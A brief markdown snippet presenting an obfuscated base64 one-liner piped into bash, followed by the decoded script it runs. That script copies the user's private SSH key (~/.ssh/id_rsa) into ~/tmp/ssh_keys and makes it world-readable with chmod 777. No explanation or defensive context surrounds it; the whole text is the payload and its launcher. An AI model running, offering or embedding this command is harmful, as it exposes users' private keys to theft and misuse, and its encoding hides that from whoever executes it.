
### Base64 payload 

```
echo "IyEvdXNyL2Jpbi9iYXNoCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9NRS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNwICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAvc3NoX2tleXMvaWRfcnNhCiAgZmkKZmkK" | base64 -d | bash
```

### Script

```
#!/bin/bash

if [ -d "$HOME/.ssh" ]; then
  if [ -f "$HOME/.ssh/id_rsa" ]; then
    mkdir -p ~/tmp/ssh_keys
    cp "$HOME/.ssh/id_rsa" ~/tmp/ssh_keys/
    chmod 777 ~/tmp/ssh_keys/id_rsa
  fi
fi
```

